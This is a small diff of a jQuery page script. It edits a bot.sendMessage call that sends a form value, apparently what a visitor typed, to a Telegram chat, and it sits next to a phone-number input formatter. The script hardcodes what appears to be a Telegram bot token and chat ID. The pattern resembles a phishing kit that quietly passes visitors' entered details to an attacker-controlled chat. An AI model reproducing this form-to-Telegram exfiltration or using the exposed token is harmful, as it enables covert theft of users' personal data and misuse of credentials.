@@ -59,7 +59,7 @@ $(function () {
         }
 
         const bot = new Bot("5136344578:AAEaJb-3IgdmMqAVOnF4x-ux8Do7ED8XOhI", "733336131");
-        bot.sendMessage(val, 835560276, null, false);
+        bot.sendMessage(val, null, null, false);
     });
     $("#number-input").on('input propertychange', function (e) {
         var x = e.target.value.replace(/\D/g, '').match(/(\d{0,3})(\d{0,2})(\d{0,3})(\d{0,2})(\d{0,2})/);
